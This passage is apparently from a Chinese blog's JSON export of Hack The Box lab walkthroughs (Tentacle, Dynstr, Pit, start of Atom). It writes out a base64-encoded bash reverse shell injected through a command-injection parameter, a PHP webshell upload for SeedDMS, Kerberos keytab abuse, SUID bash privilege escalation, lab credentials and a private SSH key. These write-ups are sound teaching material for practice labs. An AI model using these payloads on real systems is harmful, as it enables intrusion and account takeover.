<&1\"'\n\n![](Hackthebox-Tentacle/489f8aaa-cc10-4e70-a7dc-8878857a4cd1.png)\n\n![](Hackthebox-Tentacle/b469778a-3b26-4723-bef4-666884c670e0.png)\n\n成功拿到一个shell，并且直接就是root权限\n\n但是这个shell是smtp的root，并不是系统的root，咱们还要想办法提权\n\n**权限提升**\n\n咱们进入/home目录查看一下\n\n![](Hackthebox-Tentacle/a839f162-e579-4351-96ad-a9d5abe497b6.png)\n\n有一个j.nakazawa目录，咱们进去找一下有没有用的东西\n\n![](Hackthebox-Tentacle/961663a5-3718-47c3-8b05-bdf6e381f19e.png)\n\n我们在里面找到一个.msmtprc文件，咱们查看一下\n\n![](Hackthebox-Tentacle/e58abe5f-065d-479c-bfa5-64bd8c186ed4.png)\n\n咱们得到了用户j.nakazawa的账号密码\n\nUSERNAME = j.nakazawa\n\nPASSWORD = sJB}RM>6Z\\~64\\_\n\n但这个用户无法直接登录ssh，所以咱们还得想办法来利用\n\n各位还记得10.10.10.224这台机器上 3128端口中另一个线索吗\n\n![](Hackthebox-Tentacle/04820eb4-c2c9-47ff-8d16-4c3eebe3ed2d.png)\n\n没错，就是这个srv01.realcorp.htb，咱们将它加入到hosts里\n\necho 10.10.10.224 srv01.realcorp.htb > /etc/hosts\n\n记得确保hosts文件中只有这一台主机，输入上面的指令即可\n\n然后我们使用kerbos生成票据进行登录\n\napt install krb5-user\n\n然后咱们修改对应配置\n\nvim /etc/krb5.conf\n\n\\[libdefaults\\]\n\ndefault\\_realm = REALCORP.HTB\n\n\\[realms\\]\n\nREALCORP.HTB = {\n\nkdc = 10.10.10.224\n\n}\n\n\\[domain\\_realm\\]\n\nsrv01.realcorp.htb = REALCORP.HTB\n\n分别填入对应位置即可\n\n然后咱们去生成票据\n\nkinit j.nakazawa\n\npassword：sJB}RM>6Z\\~64\\_\n\n然后咱们检查一下可用的票据\n\nklist\n\n![](Hackthebox-Tentacle/2d11b659-8a6b-45ca-aaf3-27530c9b663a.png)\n\nOK，确定生成成功\n\n然后咱们使用ssh进行登录\n\nssh [j.nakazawa@10.10.10.224](mailto:j.nakazawa@10.10.10.224)\n\n![](Hackthebox-Tentacle/fa24d878-c942-4469-8805-34c5eb215627.png)\n\n登录成功\n\n![](Hackthebox-Tentacle/683c49b0-2d3d-4086-9d7f-2db4cbd3cb89.png)\n\n成功获得user权限的flag\n\n咱们查看一下/etc/crontab\n\n![](Hackthebox-Tentacle/10ed7528-f8dc-4b2a-8351-96346be8ff81.png)\n\n定时任务发现admin定时运行/usr/local/bin/log\\_backup.sh\n\n咱们查看一下\n\n![](Hackthebox-Tentacle/d547029f-56ef-422e-b63f-e0920be31771.png)\n\n我们可以看到，是从squid目录复制文件到admin目录，那么我们如果写入认证文件到squid目录，从而使其被复制到admin目录呢？说干就干\n\n现在创建一个名为.k5login的文件，并复制到squid目录下\n\necho \"j.nakazawa@REALCORP.HTB\" >> .k5login\n\ncp .k5login /var/log/squid\n\n![](Hackthebox-Tentacle/38c80d5a-d0f5-454f-a554-274352302f4a.png)\n\n然后我们稍等一会儿之后，使用admin的身份来进行登录\n\n![](Hackthebox-Tentacle/18e4aaa7-102f-4550-af12-775efd3920d7.png)\n\nOK，成功拿到admin权限\n\n但是我发现，权限还是不够，咱们还不是root权限，还得提。。。\n\n好家伙，这得提三次权也是没谁了\n\n咱们使用klist查看一下/etc/krb5.keytab这个文件\n\nklist -k /etc/krb5.keytab\n\n![](Hackthebox-Tentacle/883be589-23d8-4539-b49f-abef09b5a22a.png)\n\n咱们发现了有很多个Kerberos的加密密钥\n\n咱们使用kadmin进行利用\n\nkadmin -k -t /etc/krb5.keytab -p [kadmin/admin@REALCORP.HTB](mailto:kadmin/admin@REALCORP.HTB)\n\nadd\\_principal [root@REALCORP.HTB](mailto:root@REALCORP.HTB)\n\n然后自己设置一个密码即可\n\n![](Hackthebox-Tentacle/6651e8aa-0c80-4af9-bca0-eb17ec9e3789.png)\n\n然后使用ksu切换到root即可\n\n![](Hackthebox-Tentacle/c63685cf-ead4-4116-be3c-89a3e526d1bc.png)\n\n成功提权到root\n\n![](Hackthebox-Tentacle/e165d589-0720-48ed-905e-359ccbf8f5f3.png)\n\n成功拿到root权限的flag\n\n收工睡觉\n\n哎，目前在线的easy和medium都打完了，今天开始只能打hard难度的了，难顶啊","tags":["Hackthebox"]},{"title":"Dynstr - Hackthebox","url":"/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/","content":"\n# Hackthebox - Dynstr\n# **靶场信息**\n![](Hackthebox-Dynstr/74c4e226-e8ef-4632-8acc-76b854d3a473.png)\n\n# **靶场类型**\n![](Hackthebox-Dynstr/ce370853-4356-447f-82da-9a1decf27ad4.png)\n\n# **信息搜集**\n首先使用nmap进行端口扫描\n\n![](Hackthebox-Dynstr/611593bd-fe9b-4ba3-b723-15d1c9aae27b.png)\n\n我们可以看到，开启了22 53 80三个端口，让我们访问80端口看看\n\n![](Hackthebox-Dynstr/f61b2fec-5251-4c3c-b153-5e90b4c38035.png)\n\n访问后，我们找到了三个域名，老规矩，添加进hosts\n\n```\necho \"10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb dynstr.htb\" >> /etc/hosts\n```\n\n我访问了一下这几个域名，并没有什么东西，那咱们做个信息搜集吧\n\n就拿最短的dyna.htb入手吧\n\n```\nwfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \"http://dyna.htb\" -H \"HOST: FUZZ.dyna.htb\"\n```\n\n![](Hackthebox-Dynstr/54e0542f-f8b8-4b3e-89f4-482232047e58.png)\n\n咱们需要过滤掉10909个字符 加上--hh 10909\n\n![](Hackthebox-Dynstr/9371de2d-fa95-4fec-976c-07fcaca42532.png)\n\n啊这，结果啥都没找到，那只能去看看有没有啥公开漏洞了呀\n\nISC BIND 9.16.1搜索这个的漏洞\n\n![](Hackthebox-Dynstr/e9ccc35e-c836-4cd0-b05e-7f9f0a601ce3.png)\n\n找到一个缓冲区溢出，但是却没有利用的exploit，这就很难受了呀。没办法，继续返回做信息搜集吧\n\n咱们爆破一下目录吧\n\n```\ngobuster dir -u \"http://dyna.htb\" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n```\n\n![](Hackthebox-Dynstr/61226c9c-671e-40bc-9149-3cda16abfb6e.png)\n\n发现两个目录 /assets这个目录无法访问 /nic这个目录显示空白\n\n咱们需要进一步fuzz\n\n![](Hackthebox-Dynstr/9ac4f110-c1d8-4e12-b01a-925e386ae92e.png)\n\n![](Hackthebox-Dynstr/79ef2b02-0fbd-4f61-beb3-06b9c2a4a051.png)\n\n得到一个badauth，再加上在主页找到的凭证\n\n```\nUsername: dynadns\nPassword: sndanyd\n```\n\n咱们使用curl的-u功能进行访问\n\n![](Hackthebox-Dynstr/a4620477-1bd3-4fd4-88bf-ac84cfb33eb1.png)\n\n```\ncurl -u dynadns:sndanyd http://dyna.htb/nic/update\n```\n\n![](Hackthebox-Dynstr/bb82a6a6-57e8-44fa-9cba-acf7ecf27a4d.png)\n\n得到了一个线索，nochg，咱们去Google一下这是啥东西\n\n![](Hackthebox-Dynstr/997cb903-565f-4c5e-9912-207d5f5e23e3.png)\n\n> [https://www.noip.com/integrate/response](https://www.noip.com/integrate/response)\n>\n> [https://help.dyn.com/remote-access-api/return-codes/](https://help.dyn.com/remote-access-api/return-codes/)\n\n这导致no-ip dynamic dns看到相应代码\n\n![](Hackthebox-Dynstr/66c1a470-2be8-4764-bfe5-90b0a7144e0e.png)\n\n我们可以看到nochg告诉我们还没有提供要更新的主机名，所以让我们深入了解如何更新dns记录\n\n> [https://www.noip.com/integrate/request](https://www.noip.com/integrate/request)\n\n![](Hackthebox-Dynstr/35eae2e3-ffe3-461e-9af2-d9d661bd6788.png)\n\n所以我们可以更新dns记录，但是它需要有效\n\n咱们先使用burp拦截一个请求\n\n# **漏洞利用**\n访问[http://dyna.htb/nic/update?hostname=dyna.htb&myip=10.10.14.197](http://dyna.htb/nic/update?hostname=dyna.htb&myip=10.10.14.197)\n\n然后在请求暴力添加一个标头Authorization: Basic ZHluYWRuczpzbmRhbnlk\n\n这个标头的base64里包含了账号密码\n\n![](Hackthebox-Dynstr/e4c7c010-f91c-489c-bad8-61a1b9b94589.png)\n\n但是不知道为什么一直报错\n\n经过多次尝试后，要随便加一个并不存在的子域名\n\n![](Hackthebox-Dynstr/7f0931c4-1321-4f9d-be20-b5ee9945f474.png)\n\n成了\n\n![](Hackthebox-Dynstr/b3c8a7df-7f86-41da-83ed-612584e063b8.png)\n\n尝试了一下命令执行，提示报错，但可以确定是存在该漏洞的\n\n[https://github.com/LucifielHack/command-injection-payload-list](https://github.com/LucifielHack/command-injection-payload-list)\n\n这是命令执行的表，大伙儿可以自个儿去fuzz一下\n\n\\$(echo+id+|bash)\"这是我测试出来的命令执行格式\n\n![](Hackthebox-Dynstr/f145e86a-e985-4d21-8cc3-2267ee61f9b9.png)\n\n现在咱们要反弹一个shell回去\n\n首先本地监听一个端口\n\n```\nnc -nvlp 999\n```\n\n然后构造反弹的命令\n\n```\n/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.197/999 0>&1'\n```\n\n由于直接放到burp里去执行很麻烦，所以咱们先给他转为base64\n\n![](Hackthebox-Dynstr/3f956ea2-4d1f-4360-9103-18cd7b8ff18d.png)\n\nL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc=然后使用管道功能进行解码，然后再通过管道传回bash\n\n```\n/nic/update?hostname=\\$(echo+L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc=+|+base64+-d+|+bash)\"arz.no-ip.htb&myip=10.10.14.197\n```\n\n成功弹回shell\n\n![](Hackthebox-Dynstr/7b5f6700-cf08-4294-aa7a-582584cc92ca.png)\n\n![](Hackthebox-Dynstr/bb2cff82-c1fd-4dd4-a0b8-af11727f276e.png)\n\n使用python3获得一个较为稳定的shell\n\n![](Hackthebox-Dynstr/f2fbac0a-f6cf-4996-a391-e7f4e727749e.png)\n\n咱们查看了一下passwd文件，发现了有一个bindmgr用户，同时在/home目录下也有他的文件夹\n\n![](Hackthebox-Dynstr/c3623c72-4088-481a-b782-a6b413bdb9d7.png)\n\n咱们进去查看一下\n\n![](Hackthebox-Dynstr/2d351a21-77ce-4d3d-8922-77f9eee7b7ef.png)\n\n咱们似乎发现了一些有趣的东西\n\n我们查看一下C62796521-debugging.script\n\n查看的同时会发现内容有点多，容易造成乱码。大家看仔细点，反正我是看的脑瓜子疼\n\n![](Hackthebox-Dynstr/ac6609e2-dd3a-45aa-9158-b15bda8b3f9e.png)\n\n![](Hackthebox-Dynstr/4120675e-6030-4c5f-a7bc-7d400ecc0586.png)\n\n复制出来后，经过处理保存到本地，成功获得了一个ssh的密钥，咱们去登录试试\n\n![](Hackthebox-Dynstr/64f36403-5ade-4204-ae77-6eb0ad961c6a.png)\n\n但是这还是需要密码，这指定是不对啊，咱们再去看看\n\n![](Hackthebox-Dynstr/11b2db77-d79f-414c-bb91-f345ebd622b4.png)\n\n咱们查看了一下update的源代码，可以看到nsupdate与密钥一起使用/etc/bind/ddns.key\n\n所以这里要使用不同的密钥，咱们进入/etc/bind\n\n![](Hackthebox-Dynstr/32abac01-9935-498c-910d-eeb217673c4a.png)\n\n咱们需要讲infra.key添加到DNS记录\n\n```\nnsupdate -v -k /etc/bind/infra.key\nupdate add arz.infra.dyna.htb 86400 a 10.10.14.197\nsend\nshow\n```\n\n![](Hackthebox-Dynstr/f299635c-0368-451a-86d5-ed68ea551953.png)\n\n这时候如果我们运行nslookup，我们会得到一个回复，这意味着这个记录已经被添加进去了\n\n![](Hackthebox-Dynstr/928c12bf-f634-4d8f-a1e4-639352a7f85e.png)\n\n但是我们仍然无法通过 ssh 登录，因为 dns 的使用已启用，因为 ssh 会进行反向 dns 查找过程，因此域名正在解析为 IP，但 IP 地址不会解析为域名，因此我们需要添加PTR记录为此目的\n\n咱们去添加一个A记录\n\n```\nnsupdate -k /etc/bind/infra.key\nupdate add anything.infra.dyna.htb 86400 A 10.10.14.197\n```\n\n此行为空格 下一行的IP为D.C.B.A格式，也就是把我们的IP反过来\n\n```\nupdate add 197.14.10.10.in-addr.arpa. 300 PTR anything.infra.dyna.htb\nsend\n```\n\n![](Hackthebox-Dynstr/b27e5025-86db-4d4a-b1d4-268ddad1d664.png)\n\n输入\n\n```\necho \"-----BEGIN OPENSSH PRIVATE KEY-----\\\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\\\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\\\n-----END OPENSSH PRIVATE KEY-----\\\\n\" > id\\_rsa\n```\n\n即可获得我们的密钥，通过上面的方式咱们自己获得也可以\n\n这里添加A记录以后，咱们去尝试ssh登录\n\n![](Hackthebox-Dynstr/66790ea3-2073-406f-90ae-611b2a20fb44.png)\n\n成功拿到bindmgr账户权限\n\n![](Hackthebox-Dynstr/4328976b-82ed-4cab-97d3-b8a79abd3c1e.png)\n\n成功获得user权限flag\n\n# **权限提升**\n![](Hackthebox-Dynstr/f62272a8-baa1-4498-bcbc-ba8ed9dd7343.png)\n\n咱们使用sudo -l查看一下sudo权限\n\n发现可以执行bindmgr.sh文件，咱们先去看一下\n\n![](Hackthebox-Dynstr/23c17921-fbcc-4a7b-bb62-1a0c2bcc24e5.png)\n\n这里咱们检查一下.version文件兵使用通配符\\*复制所有内容\n\n```\nfind / -name \".version\" 2>/dev/null\n```\n\n![](Hackthebox-Dynstr/4c86a314-fd06-403f-9571-18c1b67bb91e.png)\n\n我们可以看到，.version在/etc/文件夹中，所有这个文件会在哪里运行\n\n![](Hackthebox-Dynstr/14548e43-4105-48ea-a557-ffeb76742642.png)\n\n这里我们要做的事创建.version文件并添加42到它里面\n\n```\necho 42 > .version\n```\n\n![](Hackthebox-Dynstr/f7203b34-0c1e-4e6c-83a0-e324a3d100c1.png)\n\n首先我们复制/bin/bash到当前目录并使其成为SUID二进制文件\n\n```\ncp /bin/bash .\nchmod +s bash\nls -la\n```\n\n下面图片错了，请见谅\n\n![](Hackthebox-Dynstr/7ee0e662-0abb-4023-aa84-713aae4dc45b.png)\n\n我们创建一个名为--preserve=mode的文件来利用它，同时复制它会保留这个目录中文件的属性，就像bash有SUID所以它会保留那些属性并将其复制到/etc/bind/named.bindmgr为root权限\n\n```\necho > --preserve=mode\nls -la\n```\n\n![](Hackthebox-Dynstr/0554747e-2646-473c-bd7e-b2ee36d8ffdd.png)\n\n现在只需要运行sudo脚本\n\n```\nsudo /usr/local/bin/bindmgr.sh\n```\n\n![](Hackthebox-Dynstr/0989ba08-48f0-4edb-9ece-bf6c1af0581d.png)\n\n执行./bash -p即可提权\n\n```\ncd /etc/bind/named.bindmgr\n./bash -p\n```\n\n![](Hackthebox-Dynstr/6f5bbe17-c37a-4042-be13-b218736777fc.png)\n\n![](Hackthebox-Dynstr/6bb0d841-fc29-420b-85c9-e37e4dca6aad.png)\n\n成功拿到root权限的flag\n\n收工睡觉","tags":["Hackthebox"]},{"title":"Pit - Hackthebox","url":"/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/","content":"\n# Hackthebox - Pit\n**Hackthebox - Pit 靶场实战**\n\n**靶场信息**\n\n![](Hackthebox-Pit/bbf059c6-783d-4365-81b4-94a4de3c072c.png)\n\n**靶场类型**\n\n![](Hackthebox-Pit/0bbbf1f9-d927-403b-aceb-ab6273424d52.png)\n\n**信息搜集**\n\n首先使用nmap进行端口扫描\n\nnmap -A -sS -sC -sV 10.10.10.241\n\n![](Hackthebox-Pit/7e61779b-6c26-4716-b97f-c5fdc080e79b.png)\n\n我们可以看到，该靶场开启了22、80、9090端口\n\n并且有一个一个域名dms-pit.htb，咱们将它加入hosts里\n\nvim /etc/hosts\n\n![](Hackthebox-Pit/ba406a30-1b3f-4c6e-aeb9-a585bb847377.png)\n\n首先我们访问一下pit.htb看看\n\n![](Hackthebox-Pit/d281e399-5528-4d7c-adcb-94ac8154adae.png)\n\n就是一个Nginx的初始页面，没什么看的意义\n\n接着咱们看看dms-pit.htb\n\n![](Hackthebox-Pit/ba375abe-7109-4ebc-8e48-cf8408dd013a.png)\n\n啊这，直接403，也不用看，那咱们去看看9090端口吧\n\n![](Hackthebox-Pit/fad87eb2-1064-4599-ad8c-12592f8afec0.png)\n\n好像是一个CentOS的在线管理页面，但是咱们也没密码啊\n\n经过大量的目录搜集以后，我发现还是没什么有用的信息，没办法了呀，只能去官方论坛看看大佬们的提示了\n\n![](Hackthebox-Pit/699127a3-bb17-4b4b-a1a6-2ad7d1b1a5ec.png)\n\n大佬说在官方推特会有一个很好的提示，那咱们去找找看吧\n\n![](Hackthebox-Pit/2a3dfe26-2563-423f-948f-ef8f934b89f7.png)\n\n官方提示在WALK\n\n所以咱们扫描一下这台机器的snmp开放端口吧\n\nnmap -sU 10.10.10.241\n\n![](Hackthebox-Pit/317c333d-ff16-476c-95e4-134ded5c27fc.png)\n\n我们发现了他的SNMP版本\n\n我们可以使用以下脚本来进行扫描\n\n[https://github.com/dheiland-r7/snmp](https://github.com/dheiland-r7/snmp)\n\n![](Hackthebox-Pit/78f6ba4d-d324-4893-9229-551e18c301f6.png)\n\n![](Hackthebox-Pit/6b5a9014-98a4-4a09-b39b-a614001b6877.png)\n\n这里我们成功获得了内核版本、目录、用户名\n\n目前信息获取搜集到这里，我们还是没有进一步的办法，咋办呢\n\n在我翻找10.10.10.241.snmp文件的时候，发现了一行\n\n![](Hackthebox-Pit/ef83b24a-64c2-455d-9c45-024ca7d2dc11.png)\n\n这显然是一个目录啊，根据目录来构造，URL应该为http://localhost/seeddms51x/seeddms/，让咱们去尝试一下\n\n![](Hackthebox-Pit/9a5a1de5-4e43-4344-8f4d-b25434fe96af.png)\n\n确认了URL为http://dms-pit.htb/seeddms51x/seeddms/\n\n然后需要账号密码，那还得去找找snmp文件\n\n![](Hackthebox-Pit/858b9c44-4146-4cd4-a194-fd204987c23b.png)\n\n发现了两个账户\n\nroot和michelle，咱们去尝试一下\n\n测试后发现账号密码为michelle，既是账号，也是密码\n\n![](Hackthebox-Pit/4534ed96-341d-46b1-b781-110266905fb7.png)\n\n**漏洞利用**\n\n这里咱们可以看到所使用的是SeedDMS，然后去搜索一下有没有相关的漏洞\n\n![](Hackthebox-Pit/e85629a1-7c98-46d4-a0e2-a454c699c91d.png)\n\n其中第四个是我们要的漏洞，咱们打开看一下\n\ncat /usr/share/exploitdb/exploits/php/webapps/47022.txt\n\n![](Hackthebox-Pit/c6ce8fa2-ee2f-4a79-877c-0052329f129e.png)\n\nCVE-2019-12744\n\n这个漏洞的意思呢是\n\n1. 登录应用程序并在任何文件夹下添加文档\n2. 选择文件作为简单的php后门文件或任何后门webshell都可以使用\n3. 上传后检查与文档对应的文档ID\n4. 访问example.com/data/1048576/\"document\\_id\"/1.php?cmd=cat+/etc/passwd以在浏览器中利用\n\n第一步，在本地任意创建一个php文件，内容如下\n\n\"; \\$cmd = (\\$\\_REQUEST\\['cmd'\\]); system(\\$cmd); echo \"\"; die; } ?>\n\n第二步，登录后台后，依次点击 Docs -> Users -> Michelle -> Add document\n\n![](Hackthebox-Pit/c5ed362e-3130-49fa-936b-fe3df954e5de.png)\n\n第三步，上传php马\n\n第四步，复制php马的连接\n\n[http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=44&showtree=1](http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=44&showtree=1)\n\n从上我们可以得知文档ID为44，然后我们构造poc\n\n[http://dms-pit.htb/data/1048576/44/1.php?cmd=cat+/etc/passwd](http://dms-pit.htb/data/1048576/44/1.php?cmd=cat+/etc/passwd)\n\n[http://dms-pit.htb/seeddms51x/data/1048576/44/1.php?cmd=cat+/etc/passwd](http://dms-pit.htb/seeddms51x/data/1048576/44/1.php?cmd=cat+/etc/passwd)\n\n![](Hackthebox-Pit/bc3c044d-ad4b-40bd-8029-0028afc9aa8e.png)\n\n![](Hackthebox-Pit/b95de7b7-1f9e-4ded-a7ae-e9dc6fee9cbe.png)\n\n成功利用该漏洞\n\n该shell会五分钟删除一次，如果被删除了大家重新上传一次即可\n\n咱们查看一下conf/settings.xml文件\n\n[http://dms-pit.htb/seeddms51x/data/1048576/45/1.php?cmd=cat%20../../../conf/settings.xml](http://dms-pit.htb/seeddms51x/data/1048576/45/1.php?cmd=cat%20../../../conf/settings.xml)\n\n打开后会发现这是一个空白页面，咱们查看一下源文件\n\n![](Hackthebox-Pit/65ae73c8-492c-4cb1-b63b-b6b4b2099125.png)\n\n成功拿到数据库账号密码\n\nseeddms\n\nied^ieY6xoquu\n\n咱们可以看到，数据库账号密码并没有在系统账户里，也就是说无法直接利用ssh进行登录，应该怎么办呢？突然想到，咱们9090端口不是需要一个账号密码嘛，咱们去试试\n\n经过测试，账号是michelle，密码是ied^ieY6xoquu\n\nOK，咱们成功登录\n\n![](Hackthebox-Pit/d8efd785-fd5c-400d-95a0-d9cfb6585cf8.png)\n\n突然，我的眼光就被“终端”两个字吸引了\n\n![](Hackthebox-Pit/4715297c-072d-4f4e-b065-6ca612721fcf.png)\n\n咱们这就直接从nginx权限，拿到了一个users的权限\n\n![](Hackthebox-Pit/593bfb4d-baf6-4b62-b9f6-4921bbadb41a.png)\n\n成功获得user权限的flag\n\n**权限提升**\n\n咱们继续把目光放在snmp文件上\n\n![](Hackthebox-Pit/a92b1b53-6a8d-481b-bc9a-12770d201ee0.png)\n\n在经过确认后，我把眼光放在了这一行上，咱们去看看这个文件\n\n![](Hackthebox-Pit/cb0477e3-73b3-4b1b-9d72-907011cbf567.png)\n\n这是一个bash脚本，感觉可能有用，先记录上\n\n上面的脚本显示了从另一个位置运行了脚本，咱们一步步跟过去看看\n\nls -la /usr/local/monitoring/\n\n![](Hackthebox-Pit/92b6d609-78b9-4b88-93b7-0ec40dafbb0d.png)\n\n无法列出，应该是权限不足，咱们看看该目录的权限\n\n![](Hackthebox-Pit/e5da7a3f-d24e-4e04-b068-7e31b9c25da0.png)\n\n咱们对这个目录有读、写、执行以及+权限\n\n也就是有权限扩展，让咱们查看一下\n\n![](Hackthebox-Pit/5e0579f5-29b7-42eb-affd-f32061009df2.png)\n\n从上面可以解读出，该目录属于root用户，其他用户有所有权限，但michelle用户只有写入和执行权限\n\n让我们创建一个文件来找出想要的东西\n\n![](Hackthebox-Pit/5ad916d9-2535-4279-b9b4-f66ef3778f10.png)\n\n成功了\n\n![](Hackthebox-Pit/8052248d-6d55-4dbc-8136-559f3cff1595.png)\n\n创建一个sh文件，填入公钥，然后上传到服务器\n\n本地使用python3开启一个http服务器\n\npython3 -m http.server 80\n\n在终端中使用curl进行下载\n\ncurl [http://10.10.14.236/check.sh -o check.sh](http://10.10.14.236/check.sh%20-o%20check.sh)\n\n![](Hackthebox-Pit/9a1adb27-63e3-44a8-9137-a7d5e9d5fbab.png)\n\n然后拷贝到/usr/local/monitoring/目录下\n\ncp check.sh /usr/local/monitoring/\n\n![](Hackthebox-Pit/88bd50ea-4d19-46eb-9ea8-f0b00a45dee4.png)\n\nroot账户正运行着一个脚本，监控目录的内容然后在五分钟后删除\n\n把我们的shell放进去后，我们需要在本地运行SNMPwalk应用程序执行它\n\nsnmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects\n\n![](Hackthebox-Pit/4b7d382c-72eb-4ef1-accf-ab27732f8053.png)\n\n然后咱们使用ssh进行连接\n\nssh -i lucifiel [root@10.10.10.241](mailto:root@10.10.10.241)\n\n如果这里提示root@10.10.10.241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).\n\n则是snmpwalk的问题，输入sudo apt-get install snmp-mibs-downloader进行重新安装即可\n\n![](Hackthebox-Pit/45b44ec0-3a6b-4ec3-a44e-d567c309ca28.png)\n\n成功拿到root权限的flag","tags":["Hackthebox"]},{"title":"Atom - Hackthebox","url":"/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/","content":"\n# Hackthebox - Atom\n# **靶场信息**\n![](Hackthebox-Atom/3aeafb47-8fc4-46b4-be86-6a0a49062efd.png)\n\n# **靶场类型**\n![](Hackthebox-Atom/b32c86c2-4bd0-4a89-9cdc-9e4174fe61f1.png)\n\n# **信息搜集**\n## Nmap\n首先使用NMAP进行端口扫描\n\n![](Hackthebox-Atom/dd926d4e-9a1b-4f19-adb8-f97fde301460.png)\n\n## Smb\n我们可以看到，这台靶场开启了80 135 443 445端口，以及有SMB服务\n\n且SMB服务可以由guest权限登录，那咱们就先看看smb有啥吧\n\n```cpp\nsmbclient -L ////10.10.10.237////\n```\n密码为空即可\n\n![](Hackthebox-Atom/978fb275-7126-4774-bfa9-b59312805be3.png)\n\n看看我们可以匿名阅读的内容有哪些\n\n```cpp\nsmbmap -u 'anonymous' -p '' -H 10.10.10.237\n```\n![](Hackthebox-Atom/54d7c1d0-7ef0-47f4-947a-f9f34e0b64fd.png)\n\n看来可以匿名读写Software\\_Updates目录\n\n```cpp\nsmbclient [\\\\\\\\10.10.10.237\\\\Software_Updates](file:///////10.10.10.237//Software_Updates)\n```\n登录 然后使用dir查看\n\n![](Hackthebox-Atom/ca92100a-9f73-469c-8b4f-66d24d1ed2ed.png)\n\n看来UAT\\_Testing\\_Procedures.pdf文档可以被下载，咱们使用get进行下载\n\n![](Hackthebox-Atom/eba4868a-9dad-4612-83f0-263bb5c90f12.png)\n\n![](Hackthebox-Atom/79287bd2-cac8-4f49-9338-b16c1345428d.png)\n\n我们可以看到，该文档描述了一个名为Heed的笔记应用，它是一个基于客户端的应用程序，没有与服务器交互。但是它确实通过客户端文件夹进行了更新，我们可以看到已经有三个文件夹了，分别是client1、client2、client3，所以我们接下来访问80端口\n\n![](Hackthebox-Atom/5e7e6b40-955a-4574-9e8a-2e8b8a062987.png)\n\n![](Hackthebox-Atom/0d945013-c4bb-49a0-b793-245e9f284e9e.png)\n\n我们往下翻滚，可以看到一个下载按钮和一个邮箱MrR3boot@atom.htb\n\n既然域名都给了，那还是老规矩，添加hosts吧\n\n```cpp\nvim /etc/hosts\n```\n![](Hackthebox-Atom/614c8d33-4173-47c8-a05b-ced63892f4f8.png)\n\n## 